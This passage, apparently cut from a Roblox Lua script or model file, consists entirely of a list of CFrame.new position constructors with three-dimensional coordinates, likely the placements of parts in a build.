CFrame.new(2.134834051132202, 1.4294102191925049, 9.148130416870117),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, -4.234835624694824),
CFrame.new(-1.265164852142334, 0.5000002384185791, -2.234834909439087),
CFrame.new(4.734834671020508, 1.000001311302185, -1.2348353862762451),
CFrame.new(4.134834289550781, 1.8000012636184692, 6.165164947509766),
CFrame.new(1.2348341941833496, -0.9999992251396179, -8.734833717346191),
CFrame.new(4.234834671020508, -0.49999749660491943, 0.7651643753051758),
CFrame.new(-2.265162706375122, -2.700000047683716, 0.16516387462615967),
CFrame.new(5.234834671020508, -2.4999983310699463, 2.765164613723755),
CFrame.new(0.23483704030513763, -5, -4.734835624694824),
CFrame.new(3.2348363399505615, -4.999999523162842, -3.234835147857666),
CFrame.new(-2.265164613723755, 2.4999988079071045, -3.234834671020508),
CFrame.new(3.2348363399505615, -2.4999983310699463, -4.734835624694824),
CFrame.new(5.734833717346191, 2.000002145767212, -4.734834671020508),
CFrame.new(0.23483513295650482, -0.49999964237213135, -4.734834671020508),
CFrame.new(5.234832763671875, 2.5000016689300537, -2.234834671020508),
CFrame.new(3.7348363399505615, -2.699998140335083, -0.8348362445831299),
CFrame.new(3.7348363399505615, -2.699998140335083, -2.8348355293273926),
CFrame.new(4.234834671020508, 0.000002339482307434082, 0.7651643753051758),
CFrame.new(2.2348344326019287, 1.0000003576278687, -1.2348353862762451),
CFrame.new(3.2348363399505615, -4.7071051597595215, -7.527728080749512),
CFrame.new(4.234836578369141, -2.9999983310699463, -3.234834909439087),
CFrame.new(2.2348363399505615, -2.699998617172241, -0.8348362445831299),
CFrame.new(2.2348363399505615, -2.699998617172241, 2.1651651859283447),
CFrame.new(-2.765164613723755, 2.4999992847442627, -4.734834671020508),
CFrame.new(-0.7651649713516235, 0.9999995827674866, -2.234834909439087),
CFrame.new(-2.7651665210723877, 2.9999988079071045, -4.234834671020508),
CFrame.new(2.2348363399505615, -4.70710563659668, -7.527728080749512),
CFrame.new(3.2348344326019287, 1.5000009536743164, 0.7651643753051758),
CFrame.new(-1.7651629447937012, -2.500000238418579, -4.734835624694824),
CFrame.new(5.234834671020508, -2.499997854232788, -2.234835147857666),
CFrame.new(-1.2651629447937012, -2.700000047683716, 0.16516387462615967),
CFrame.new(2.2348344326019287, 1.0000003576278687, -1.2348353862762451),
CFrame.new(2.2348344326019287, 1.0000005960464478, -0.7348358035087585),
CFrame.new(0.23483513295650482, 1.5, 0.7651643753051758),
CFrame.new(4.734834671020508, -0.9999982714653015, -4.234835624694824),
CFrame.new(-0.265164852142334, 1.5000004768371582, -4.234834671020508),
CFrame.new(-0.7651649713516235, 1.999998688697815, 3.265164852142334),
CFrame.new(-0.7651630640029907, -3.000000476837158, -3.734834909439087),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, 0.7651643753051758),
CFrame.new(4.234834671020508, 0.500002384185791, -2.234834909439087),
CFrame.new(3.7348344326019287, 1.0000008344650269, 1.7651644945144653),
CFrame.new(-0.7651668787002563, 2.9999992847442627, -2.2348344326019287),
CFrame.new(5.734835624694824, -3.9999985694885254, -8.234834671020508),
CFrame.new(4.234834671020508, 1.0000015497207642, 4.265164375305176),
CFrame.new(4.234834671020508, 0.0000028163196930108825, -3.234834909439087),
CFrame.new(-0.7651630640029907, -5.000000476837158, -3.234835147857666),
CFrame.new(5.234836578369141, -4.999999046325684, -3.234835147857666),
CFrame.new(-0.7651630640029907, -5.000000476837158, -3.234835147857666),
CFrame.new(2.7348363399505615, -2.699998140335083, -2.8348355293273926),
CFrame.new(1.2348361015319824, -4.999999523162842, -4.734835624694824),
CFrame.new(-1.265164852142334, 1.4999984502792358, 1.7651644945144653),
CFrame.new(5.234834671020508, -0.9999982714653015, -1.2348353862762451),
CFrame.new(-2.265164613723755, -9.98377799987793e-07, -8.734833717346191),
CFrame.new(-2.765164613723755, 1.499998927116394, -4.734834671020508),
CFrame.new(4.234834671020508, 0.000002339482307434082, -4.234835624694824),
CFrame.new(2.2348344326019287, -0.9999992251396179, -8.734833717346191),
CFrame.new(1.2348341941833496, 1.0000005960464478, -8.734833717346191),
CFrame.new(2.2348344326019287, -0.49999916553497314, -4.734834671020508),
CFrame.new(4.734834671020508, 2.0000011920928955, -1.234834909439087),
CFrame.new(-1.265164852142334, 6.705524242534011e-07, -3.234834909439087),
CFrame.new(1.7348341941833496, 0.5, -1.2348353862762451),
CFrame.new(-1.265164852142334, 0.5000002384185791, 0.7651643753051758),
CFrame.new(-1.265164852142334, 1.9999991655349731, -4.234834671020508),
CFrame.new(5.234836578369141, -4.999998092651367, -7.234835624694824),
CFrame.new(3.7348344326019287, 2.5000016689300537, -4.734834671020508),
CFrame.new(5.234834671020508, 0.0000018626450355441193, -4.734834671020508),
CFrame.new(0.7348350286483765, 0.9999995827674866, -1.2348353862762451),
CFrame.new(0.7348369359970093, -2.6999990940093994, -0.8348362445831299),
CFrame.new(1.2348341941833496, 0.5000002384185791, -0.23483578860759735),
CFrame.new(-0.7651630640029907, -1.0000001192092896, -8.734833717346191),
CFrame.new(5.734834671020508, -3.499998092651367, -3.234835147857666),
CFrame.new(-0.7651649713516235, 0.9999991059303284, -1.2348353862762451),
CFrame.new(2.7348344326019287, 1.5000009536743164, 0.7651643753051758),
CFrame.new(5.234834671020508, -1.999997854232788, -1.2348353862762451),
CFrame.new(1.2348361015319824, -2.9999992847442627, -3.234834909439087),
CFrame.new(3.7348344326019287, 1.0000008344650269, 0.7651643753051758),
CFrame.new(-0.7651649713516235, 1.4999984502792358, 3.2651658058166504),
CFrame.new(5.234834671020508, -1.999997854232788, -2.234834909439087),
CFrame.new(1.7348361015319824, -2.699998617172241, 0.16516387462615967),
CFrame.new(2.2348344326019287, 1.5000009536743164, 1.7651644945144653),
CFrame.new(5.734833717346191, 1.0000020265579224, -0.23483578860759735),
CFrame.new(5.734832763671875, 3.000002384185791, -2.2348344326019287),
CFrame.new(5.234833717346191, 1.0000020265579224, -8.734833717346191),
CFrame.new(4.234834671020508, -0.49999749660491943, 1.7651644945144653),
CFrame.new(4.734834671020508, 1.5000015497207642, -0.23483578860759735),
CFrame.new(-2.265164613723755, 1.499998927116394, -4.234834671020508),
CFrame.new(4.234834671020508, 0.500002384185791, -0.23483578860759735),
CFrame.new(5.734835624694824, -3.6464452743530273, -8.588387489318848),
CFrame.new(5.234836578369141, -4.999998092651367, -5.234834671020508),
CFrame.new(-2.265164613723755, 1.499998927116394, -2.234834671020508),
CFrame.new(-0.265164852142334, 1.5, 1.7651644945144653),
CFrame.new(1.2348361015319824, -2.6999990940093994, -0.8348362445831299),
CFrame.new(4.134834289550781, 0.8000012040138245, 5.165163040161133),
CFrame.new(2.134834051132202, 1.2330130338668823, 5.415163993835449),
CFrame.new(5.234835624694824, -2.6999971866607666, 2.1651651859283447),
CFrame.new(-0.7651649713516235, 0.9999991059303284, 0.7651643753051758),
CFrame.new(-0.7651649713516235, 0.9999995827674866, -3.234834671020508),
CFrame.new(4.234834671020508, 0.000002339482307434082, -1.2348353862762451),
CFrame.new(2.134834051132202, 1.8000003099441528, 6.165164947509766),
CFrame.new(3.2348344326019287, -0.9999987483024597, -8.734833717346191),
CFrame.new(2.2348363399505615, -4.999999046325684, -2.734834909439087),
CFrame.new(4.234834671020508, 1.5000009536743164, -0.23483578860759735),
CFrame.new(0.7348369359970093, -2.6999990940093994, -1.8348363637924194),
CFrame.new(-0.8651653528213501, 1.233012080192566, 5.415163993835449),
CFrame.new(-2.265164613723755, 1.9999982118606567, 2.765164613723755),
CFrame.new(2.2348344326019287, 1.5000015497207642, -2.234834909439087),
CFrame.new(-2.265164613723755, 1.9999991655349731, -0.23483578860759735),
CFrame.new(-2.265164613723755, 1.9999982118606567, 0.7651643753051758),
CFrame.new(5.234834671020508, -0.9999977946281433, -8.734833717346191),
CFrame.new(1.7348361015319824, -2.699998617172241, -2.8348355293273926),
CFrame.new(5.234833717346191, 1.5000015497207642, -0.23483578860759735),
CFrame.new(4.734834671020508, 2.0000016689300537, -0.23483578860759735),
CFrame.new(-1.765164852142334, 0.9999986290931702, 2.765164613723755),
CFrame.new(-1.7651629447937012, -2.000000238418579, -0.23483578860759735),
CFrame.new(1.2348341941833496, 1.0000001192092896, -0.7348358035087585),
CFrame.new(1.134833812713623, 0.4294102191925049, 10.148130416870117),
CFrame.new(1.2348361015319824, -2.6999990940093994, 0.16516387462615967),
CFrame.new(-1.7651629447937012, -5.000001430511475, -3.234835147857666),
CFrame.new(-1.765164852142334, 1.4999979734420776, 2.7651655673980713),
CFrame.new(-1.265164852142334, 4.3213378830841975e-07, -2.234834909439087),
CFrame.new(5.734832763671875, 3.000001907348633, 2.765164613723755),
CFrame.new(-2.265164613723755, 1.499998927116394, -0.23483578860759735),
CFrame.new(0.23483513295650482, -0.9999997019767761, -8.734833717346191),
CFrame.new(4.234836578369141, -2.699997663497925, 0.16516387462615967),
CFrame.new(0.23483704030513763, -2.6999990940093994, 0.16516387462615967),
CFrame.new(0.13483475148677826, 1.6705905199050903, 5.682201385498047),
CFrame.new(3.2348344326019287, 1.5000009536743164, 1.7651644945144653),
CFrame.new(0.13483475148677826, 0.9294092655181885, 9.648130416870117),
CFrame.new(0.23483704030513763, -2.6999990940093994, 2.1651651859283447),
CFrame.new(4.234834671020508, 1.5000009536743164, -1.234834909439087),
CFrame.new(0.23483704030513763, -2.6999990940093994, -1.8348363637924194),
CFrame.new(2.2348344326019287, 1.5000015497207642, -3.2348344326019287),
CFrame.new(4.734836578369141, -2.699997663497925, -0.8348362445831299),
CFrame.new(-2.265164613723755, -0.500001072883606, -8.734833717346191),
CFrame.new(2.2348363399505615, -2.4999988079071045, -4.734835624694824),
CFrame.new(5.234834671020508, -2.499997854232788, -0.23483578860759735),
CFrame.new(2.7348344326019287, 1.5000015497207642, -3.2348344326019287),
CFrame.new(-2.765164613723755, 2.4999983310699463, 3.2651658058166504),
CFrame.new(5.234835624694824, -2.6999971866607666, 0.16516387462615967),
CFrame.new(5.734834671020508, 0.0000021010637283325195, -8.734833717346191),
CFrame.new(-2.265164613723755, 0.4999990463256836, -8.734833717346191),
CFrame.new(1.7348341941833496, 1.0000001192092896, 1.7651644945144653),
CFrame.new(3.2348344326019287, 1.5000009536743164, -1.2348353862762451),
CFrame.new(5.234834671020508, -2.499997854232788, -4.234835624694824),
CFrame.new(2.2348344326019287, 1.5000015497207642, -4.234834671020508),
CFrame.new(-1.7651629447937012, -2.500000238418579, -4.234835624694824),
CFrame.new(-2.265162706375122, -5.000000476837158, -3.734834909439087),
CFrame.new(2.2348344326019287, 1.5000015497207642, -0.23483578860759735),
CFrame.new(4.234834671020508, 2.5000011920928955, 0.7651643753051758),
CFrame.new(4.734833717346191, 2.5000016689300537, -4.234834671020508),
CFrame.new(2.2348363399505615, -2.699998617172241, -1.8348363637924194),
CFrame.new(-0.26516294479370117, -2.6999995708465576, -0.8348362445831299),
CFrame.new(2.2348363399505615, -5, -3.234835147857666),
CFrame.new(4.734834671020508, -0.9999987483024597, 2.765164613723755),
CFrame.new(-1.765164852142334, 1.9999991655349731, -0.23483578860759735),
CFrame.new(-2.265162706375122, -5, -5.734834671020508),
CFrame.new(2.2348344326019287, 1.0000008344650269, -0.23483578860759735),
CFrame.new(0.7348340749740601, 1.5, -1.2348353862762451),
CFrame.new(1.2348361015319824, -5, -3.234835147857666),
CFrame.new(0.7348340749740601, 1.5, 0.7651643753051758),
CFrame.new(3.134834051132202, 0.3669881820678711, 4.915163993835449),
CFrame.new(1.7348341941833496, 1.5000009536743164, 2.7651655673980713),
CFrame.new(2.7348344326019287, 1.5000009536743164, 2.7651655673980713),
CFrame.new(4.234836578369141, -2.999997854232788, -8.734833717346191),
CFrame.new(0.13483475148677826, 0.7999995350837708, 5.165163040161133),
CFrame.new(1.2348341941833496, 1.5000004768371582, 1.7651644945144653),
CFrame.new(1.134833812713623, 1.9294100999832153, 6.648129463195801),
CFrame.new(-0.7651649713516235, 0.9999998211860657, -8.734833717346191),
CFrame.new(-1.765164852142334, -0.5000005960464478, -4.734834671020508),
CFrame.new(-1.7651629447937012, -2.0000011920928955, 0.7651643753051758),
CFrame.new(5.734834671020508, 0.5000021457672119, -8.734833717346191),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -4.734835624694824),
CFrame.new(0.7348340749740601, 1.5000009536743164, -2.234834909439087),
CFrame.new(-1.265164852142334, 1.499998927116394, -2.234834671020508),
CFrame.new(1.7348341941833496, 1.5000009536743164, -0.23483578860759735),
CFrame.new(-1.765164852142334, -0.5000015497207642, 3.2651658058166504),
CFrame.new(4.734836578369141, -2.699997663497925, -1.8348363637924194),
CFrame.new(5.734832763671875, 3.000001907348633, -1.234834909439087),
CFrame.new(4.734833717346191, 2.5000011920928955, 2.7651655673980713),
CFrame.new(1.7348341941833496, 1.5000009536743164, 1.7651644945144653),
CFrame.new(5.234833717346191, 2.0000016689300537, -2.234834671020508),
CFrame.new(1.2348341941833496, 0.9999998211860657, -1.2348353862762451),
CFrame.new(3.2348344326019287, 1.5000020265579224, -3.2348344326019287),
CFrame.new(4.234834671020508, 2.5000011920928955, -3.234834671020508),
CFrame.new(-2.765164613723755, 0.9999988675117493, -3.234834671020508),
CFrame.new(5.234833717346191, 1.5000009536743164, 0.7651643753051758),
CFrame.new(3.134834051132202, 1.929410696029663, 7.148129940032959),
CFrame.new(-1.2651629447937012, -2.700000047683716, 2.1651651859283447),
CFrame.new(1.2348341941833496, 1.5000004768371582, -1.2348353862762451),
CFrame.new(5.234833717346191, 2.0000016689300537, -4.234834671020508),
CFrame.new(5.234834671020508, -0.9999987483024597, 2.765164613723755),
CFrame.new(1.2348341941833496, 1.0000005960464478, -4.734834671020508),
CFrame.new(-1.265164852142334, 1.4999984502792358, 0.7651643753051758),
CFrame.new(2.2348344326019287, 1.5000009536743164, -1.2348353862762451),
CFrame.new(-1.765164852142334, 1.4999979734420776, -1.234834909439087),
CFrame.new(4.234834671020508, 0.500002384185791, -1.2348353862762451),
CFrame.new(-1.265164852142334, 1.4999984502792358, 2.7651655673980713),
CFrame.new(-2.265164613723755, 1.9999982118606567, 1.7651644945144653),
CFrame.new(4.734836578369141, -2.699997663497925, -1.8348363637924194),
CFrame.new(-1.7651629447937012, -3.0000009536743164, -3.234834909439087),
CFrame.new(3.2348363399505615, -2.699998140335083, 2.1651651859283447),
CFrame.new(-1.265164852142334, 2.4999988079071045, -1.234834909439087),
CFrame.new(2.2348363399505615, -2.699998617172241, -2.8348355293273926),
CFrame.new(5.234834671020508, -1.499998688697815, 0.7651643753051758),
CFrame.new(1.2348341941833496, 1.5000004768371582, 0.7651643753051758),
CFrame.new(5.234833717346191, 1.5000009536743164, 1.7651644945144653),
CFrame.new(-0.7651649713516235, 1.9999996423721313, -4.734834671020508),
CFrame.new(4.734834671020508, 2.0000011920928955, 1.7651644945144653),
CFrame.new(0.7348340749740601, 1.5, 0.7651643753051758),
CFrame.new(5.234834671020508, -0.9999987483024597, 0.7651643753051758),
CFrame.new(0.13483475148677826, 1.233012318611145, 5.415163993835449),
CFrame.new(-0.26516294479370117, -2.6999995708465576, -2.8348355293273926),
CFrame.new(-1.7651629447937012, -2.700000047683716, -0.8348362445831299),
CFrame.new(-2.265162706375122, -3.6464476585388184, -8.588387489318848),
CFrame.new(5.234835624694824, -2.6999971866607666, -2.8348355293273926),
CFrame.new(0.23483513295650482, 1.5000009536743164, -3.2348344326019287),
CFrame.new(4.734836578369141, -2.699997663497925, 2.1651651859283447),
CFrame.new(5.734833717346191, 1.5000009536743164, 3.2651658058166504),
CFrame.new(1.2348361015319824, -2.999999761581421, -3.734834909439087),
CFrame.new(0.13483475148677826, 1.9294092655181885, 7.648129940032959),
CFrame.new(-1.765164852142334, 1.9999991655349731, -4.234834671020508),
CFrame.new(-0.26516294479370117, -2.6999995708465576, 0.16516387462615967),
CFrame.new(-2.265162706375122, -5.000000476837158, -6.734835624694824),
CFrame.new(0.23483513295650482, 1.5, 2.7651655673980713),
CFrame.new(1.134833812713623, 1.6705905199050903, 5.682201385498047),
CFrame.new(4.234834671020508, 1.5000009536743164, 0.7651643753051758),
CFrame.new(1.2348361015319824, -2.6999990940093994, -2.8348355293273926),
CFrame.new(0.23483704030513763, -2.6999990940093994, -2.8348355293273926),
CFrame.new(-0.265164852142334, 1.5, 0.7651643753051758),
CFrame.new(4.234836578369141, -2.9999983310699463, -3.734834909439087),
CFrame.new(5.234833717346191, 1.5000009536743164, 2.7651655673980713),
CFrame.new(-0.8651653528213501, 1.4294092655181885, 9.148130416870117),
CFrame.new(-0.7651649713516235, 1.5, 0.7651643753051758),
CFrame.new(4.234834671020508, 2.0000011920928955, 2.765164613723755),
CFrame.new(0.23483704030513763, -2.999999761581421, -4.234835624694824),
CFrame.new(3.7348363399505615, -2.699998140335083, 0.16516387462615967),
CFrame.new(5.234834671020508, -1.4999982118606567, 1.7651644945144653),
CFrame.new(4.234836578369141, -4.999998092651367, -5.234834671020508),
CFrame.new(-1.2651629447937012, -2.700000047683716, -0.8348362445831299),
CFrame.new(5.234834671020508, -0.49999797344207764, -4.734834671020508),
CFrame.new(5.734835624694824, -2.6999971866607666, -2.8348355293273926),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(4.234834671020508, -0.49999821186065674, -4.734834671020508),
CFrame.new(-0.7651649713516235, 1.5, 2.7651655673980713),
CFrame.new(4.734834671020508, 2.0000016689300537, -2.234834671020508),
CFrame.new(1.2348341941833496, 0.4999997615814209, -1.2348353862762451),
CFrame.new(2.2348344326019287, 0.5000002384185791, -0.7348358035087585),
CFrame.new(-2.265162706375122, -2.500000238418579, -8.734833717346191),
CFrame.new(3.734832525253296, 3.0000009536743164, 2.765164613723755),
CFrame.new(1.2348341941833496, -2.8312214794823376e-07, -1.2348353862762451),
CFrame.new(4.234834671020508, 0.5000016689300537, -4.734834671020508),
CFrame.new(-0.8651653528213501, 1.929409146308899, 6.648129463195801),
CFrame.new(-1.765164852142334, -5.215405849412491e-07, -4.734834671020508),
CFrame.new(-0.7651649713516235, 1.5, 1.7651644945144653),
CFrame.new(-1.265164852142334, 2.499999761581421, 3.765164852142334),
CFrame.new(-0.7651649713516235, 1.5, -0.23483578860759735),
CFrame.new(-2.265164613723755, 1.4999979734420776, 1.7651644945144653),
CFrame.new(3.2348344326019287, -1.499998688697815, -4.734834671020508),
CFrame.new(4.234834671020508, -0.9999982714653015, -8.734833717346191),
CFrame.new(-1.765164852142334, 0.9999991059303284, -2.234834909439087),
CFrame.new(4.234834671020508, 2.0000011920928955, -0.23483578860759735),
CFrame.new(4.134834289550781, 1.9294111728668213, 8.148130416870117),
CFrame.new(-0.7651630640029907, -2.6999995708465576, 1.1651639938354492),
CFrame.new(1.7348341941833496, 1.5000009536743164, -3.2348344326019287),
CFrame.new(4.234836578369141, -4.999999046325684, -3.234835147857666),
CFrame.new(-0.7651630640029907, -5, -4.734835624694824),
CFrame.new(4.734836578369141, -2.699997663497925, 0.16516387462615967),
CFrame.new(-0.26516294479370117, -2.6999995708465576, 0.16516387462615967),
CFrame.new(-1.765164852142334, 2.4999992847442627, 1.7651644945144653),
CFrame.new(5.234834671020508, -1.4999982118606567, -2.234834909439087),
CFrame.new(5.234834671020508, -1.9999983310699463, 2.7651655673980713),
CFrame.new(4.234834671020508, 0.500002384185791, 0.7651643753051758),
CFrame.new(1.2348341941833496, -0.9999992251396179, -8.734833717346191),
CFrame.new(-0.7651668787002563, 2.9999988079071045, -3.234834671020508),
CFrame.new(4.134834289550781, 1.9294111728668213, 7.148129940032959),
CFrame.new(1.2348341941833496, 0.9999998211860657, -1.2348353862762451),
CFrame.new(2.2348363399505615, -2.9999988079071045, -8.734833717346191),
CFrame.new(2.2348344326019287, 1.0000003576278687, -1.2348353862762451),
CFrame.new(-1.265164852142334, 0.9999993443489075, 4.265164375305176),
CFrame.new(-0.7651630640029907, -1.0000001192092896, -4.734834671020508),
CFrame.new(1.7348341941833496, 1.0000001192092896, -1.2348353862762451),
CFrame.new(1.2348361015319824, -2.6999990940093994, 2.1651651859283447),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(0.7348350286483765, -5.215407554715057e-07, -1.2348353862762451),
CFrame.new(5.234833717346191, 2.0000011920928955, 2.765164613723755),
CFrame.new(-1.265164852142334, 2.4999988079071045, 0.7651643753051758),
CFrame.new(-1.765164852142334, 1.499998927116394, -2.234834671020508),
CFrame.new(5.734832763671875, 3.000002384185791, -0.23483578860759735),
CFrame.new(2.2348344326019287, 0.5000007152557373, -0.23483578860759735),
CFrame.new(4.734833717346191, 2.5000011920928955, 0.7651643753051758),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(1.2348341941833496, -2.8312214794823376e-07, -1.2348353862762451),
CFrame.new(-2.265164613723755, 2.4999988079071045, -1.234834909439087),
CFrame.new(1.7348341941833496, 4.321336461998726e-07, 1.4651641845703125),
CFrame.new(3.134834051132202, 0.9294106960296631, 9.648130416870117),
CFrame.new(-2.765164613723755, 0.9999988675117493, -4.234834671020508),
CFrame.new(-1.7651629447937012, -1.500000238418579, -4.734835624694824),
CFrame.new(1.2348361015319824, -4.999999046325684, -5.234834671020508),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -1.2348353862762451),
CFrame.new(3.2348363399505615, -2.699998140335083, -1.8348363637924194),
CFrame.new(1.7348361015319824, -2.699998617172241, 1.1651639938354492),
CFrame.new(-1.765164852142334, 2.4999988079071045, 0.7651643753051758),
CFrame.new(5.234834671020508, -0.9999982714653015, -4.234835624694824),
CFrame.new(-1.2651629447937012, -2.700000047683716, -1.8348363637924194),
CFrame.new(1.7348341941833496, -4.4703583057525975e-08, 1.7651644945144653),
CFrame.new(-1.7651629447937012, -2.700000047683716, 0.16516387462615967),
CFrame.new(-1.265164852142334, 1.499998927116394, -4.234834671020508),
CFrame.new(2.134834051132202, 1.9294102191925049, 8.648130416870117),
CFrame.new(4.734834671020508, 1.000001311302185, 2.765164613723755),
CFrame.new(-1.7651629447937012, -3.0000009536743164, -3.234834909439087),
CFrame.new(0.7348350286483765, -2.6999990940093994, 2.1651651859283447),
CFrame.new(-0.26516294479370117, -2.6999995708465576, 2.1651651859283447),
CFrame.new(-2.265162706375122, -4.000000476837158, -8.234833717346191),
CFrame.new(2.2348363399505615, -2.9999988079071045, -4.234835624694824),
CFrame.new(2.2348344326019287, -0.9999992251396179, -8.734833717346191),
CFrame.new(3.2348363399505615, -4.999999046325684, -2.734834909439087),
CFrame.new(1.2348341941833496, 1.5000009536743164, -4.234834671020508),
CFrame.new(-2.265162706375122, -2.700000047683716, -1.8348363637924194),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -8.734833717346191),
CFrame.new(-1.7651629447937012, -2.700000047683716, -1.8348363637924194),
CFrame.new(-2.265162706375122, -3.5000014305114746, -3.234835147857666),
CFrame.new(-0.7651630640029907, -3.292893409729004, -8.941941261291504),
CFrame.new(-0.8651653528213501, 1.9294092655181885, 8.148130416870117),
CFrame.new(1.7348361015319824, -2.699998617172241, -0.8348362445831299),
CFrame.new(-1.7651629447937012, -2.500000238418579, -3.234834909439087),
CFrame.new(5.234834671020508, -1.4999982118606567, -0.23483578860759735),
CFrame.new(-0.7651630640029907, -2.6999995708465576, -1.8348363637924194),
CFrame.new(2.134834051132202, 1.6705909967422485, 5.682201385498047),
CFrame.new(5.234836578369141, -4.999999046325684, -3.234835147857666),
CFrame.new(4.234834671020508, -0.9999982714653015, -8.734833717346191),
CFrame.new(-0.7651649713516235, 1.4999994039535522, -4.734834671020508),
CFrame.new(4.734836578369141, -2.699997663497925, 1.1651639938354492),
CFrame.new(1.2348361015319824, -2.6999990940093994, 0.16516387462615967),
CFrame.new(2.2348363399505615, -4.999999046325684, -4.734835624694824),
CFrame.new(5.234834671020508, -0.9999982714653015, -3.234834909439087),
CFrame.new(-0.8651653528213501, 1.6705900430679321, 5.68220329284668),
CFrame.new(3.2348344326019287, 1.5000009536743164, 2.7651655673980713),
CFrame.new(4.134834289550781, 1.4294111728668213, 9.148130416870117),
CFrame.new(3.7348363399505615, -2.699998140335083, 2.1651651859283447),
CFrame.new(-0.7651649713516235, 0.9999991059303284, 1.7651644945144653),
CFrame.new(-2.265162706375122, -2.700000047683716, 2.1651651859283447),
CFrame.new(-1.265164852142334, 2.4999992847442627, -4.234834671020508),
CFrame.new(5.234832763671875, 2.5000011920928955, -1.234834909439087),
CFrame.new(-2.7651665210723877, 2.9999988079071045, -2.2348344326019287),
CFrame.new(-2.765164613723755, 0.9999983906745911, -1.2348353862762451),
CFrame.new(4.734836578369141, -2.699997663497925, -2.8348355293273926),
CFrame.new(1.134833812713623, 0.9294102191925049, 9.648130416870117),
CFrame.new(-1.765164852142334, 1.4999979734420776, 1.7651644945144653),
CFrame.new(1.7348361015319824, -2.699998617172241, 2.1651651859283447),
CFrame.new(2.7348363399505615, -2.699998140335083, 0.16516387462615967),
CFrame.new(4.734834671020508, -0.9999987483024597, 0.7651643753051758),
CFrame.new(2.2348363399505615, -4.999999046325684, -5.234834671020508),
CFrame.new(0.7348340749740601, 1.5, 2.7651655673980713),
CFrame.new(-1.765164852142334, 0.9999993443489075, -4.734835624694824),
CFrame.new(1.2348341941833496, 1.5000009536743164, -2.234834909439087),
CFrame.new(-1.7651629447937012, -2.700000047683716, 2.1651651859283447),
CFrame.new(0.7348369359970093, -2.6999990940093994, -2.8348355293273926),
CFrame.new(2.7348344326019287, 1.0000003576278687, -1.2348353862762451),
CFrame.new(-1.765164852142334, -5.215405849412491e-07, -4.734835624694824),
CFrame.new(2.134834051132202, 0.4294102191925049, 10.148130416870117),
CFrame.new(1.7348361015319824, -2.699998617172241, -1.8348363637924194),
CFrame.new(-0.7651630640029907, -2.500000238418579, -4.734835624694824),
CFrame.new(3.2348363399505615, -2.699998140335083, -2.8348355293273926),
CFrame.new(5.234834671020508, -1.4999982118606567, 2.765164613723755),
CFrame.new(3.2348363399505615, -2.699998140335083, -0.8348362445831299),
CFrame.new(4.734834671020508, 1.5000009536743164, 0.7651643753051758),
CFrame.new(2.7348363399505615, -2.699998140335083, 0.16516387462615967),
CFrame.new(2.2348363399505615, -2.699998617172241, 1.1651639938354492),
CFrame.new(3.7348363399505615, -2.699998140335083, 1.1651639938354492),
CFrame.new(2.2348363399505615, -1.9999988079071045, -4.734835624694824),
CFrame.new(1.2348341941833496, 1.5000004768371582, 2.7651655673980713),
CFrame.new(5.234833717346191, 1.5000009536743164, -1.234834909439087),
CFrame.new(3.2348363399505615, -2.9999988079071045, -3.734834909439087),
CFrame.new(-2.265162706375122, -2.700000047683716, 1.1651639938354492),
CFrame.new(-0.7651649713516235, 1.5, -1.2348353862762451),
CFrame.new(-1.7651629447937012, -1.0000005960464478, -8.734833717346191),
CFrame.new(2.2348344326019287, 9.08970832824707e-07, -4.734834671020508),
CFrame.new(-0.8651653528213501, 0.9294092655181885, 9.648130416870117),
CFrame.new(-1.7651629447937012, -5.000000476837158, -2.734834909439087),
CFrame.new(5.234834671020508, -0.9999987483024597, 1.7651644945144653),
CFrame.new(-1.765164852142334, 2.4999988079071045, 2.7651655673980713),
CFrame.new(5.234834671020508, -1.4999982118606567, -1.2348353862762451),
CFrame.new(3.134834051132202, 1.929410696029663, 8.648130416870117),
CFrame.new(-1.265164852142334, 2.4999992847442627, -2.234834671020508),
CFrame.new(4.234836578369141, -2.699997663497925, 1.1651639938354492),
CFrame.new(-1.7651629447937012, -2.000000238418579, -1.2348353862762451),
CFrame.new(2.7348344326019287, 1.5000009536743164, 0.7651643753051758),
CFrame.new(2.2348363399505615, -2.699998617172241, 0.16516387462615967),
CFrame.new(-0.7651630640029907, -5, -7.234835624694824),
CFrame.new(2.134834051132202, 0.9294102191925049, 9.648130416870117),
CFrame.new(-2.265162706375122, -2.700000047683716, -0.8348362445831299),
CFrame.new(4.234834671020508, 2.0000011920928955, -4.234834671020508),
CFrame.new(4.734834671020508, 1.0000017881393433, -2.234834909439087),
CFrame.new(-0.265164852142334, 1.5, 0.7651643753051758),
CFrame.new(3.2348344326019287, 1.5000020265579224, -4.234834671020508),
CFrame.new(-0.265164852142334, 1.5000004768371582, -0.23483578860759735),
CFrame.new(5.234836578369141, -4.999998092651367, -4.734835624694824),
CFrame.new(-1.765164852142334, 0.9999986290931702, 0.7651643753051758),
CFrame.new(1.7348341941833496, -0.5000001192092896, -1.2348353862762451),
CFrame.new(5.734835624694824, -2.6999971866607666, -1.8348363637924194),
CFrame.new(5.234833717346191, 2.0000011920928955, 1.7651644945144653),
CFrame.new(5.734835624694824, -2.6999971866607666, 1.1651639938354492),
CFrame.new(4.234834671020508, 2.0000011920928955, -1.234834909439087),
CFrame.new(0.13483475148677826, 1.929409146308899, 6.648129463195801),
CFrame.new(4.234836578369141, -2.699997663497925, 2.1651651859283447),
CFrame.new(0.23483513295650482, -0.9999997019767761, -4.734834671020508),
CFrame.new(5.234835624694824, -2.999997854232788, -3.734834671020508),
CFrame.new(4.734836578369141, -2.699997663497925, 0.16516387462615967),
CFrame.new(-1.765164852142334, 1.499998927116394, -3.234834671020508),
CFrame.new(1.134833812713623, 1.2330127954483032, 5.415163993835449),
CFrame.new(1.134833812713623, 0.3669877052307129, 4.915163993835449),
CFrame.new(4.734836578369141, -2.699997663497925, -2.8348355293273926),
CFrame.new(3.2348363399505615, -2.699998140335083, 1.1651639938354492),
CFrame.new(-0.7651630640029907, -3.000000476837158, -4.234835624694824),
CFrame.new(-2.265162706375122, -1.5000007152557373, -8.734833717346191),
CFrame.new(-1.265164852142334, 2.4999992847442627, -0.23483578860759735),
CFrame.new(4.734834671020508, 1.5000009536743164, 2.7651655673980713),
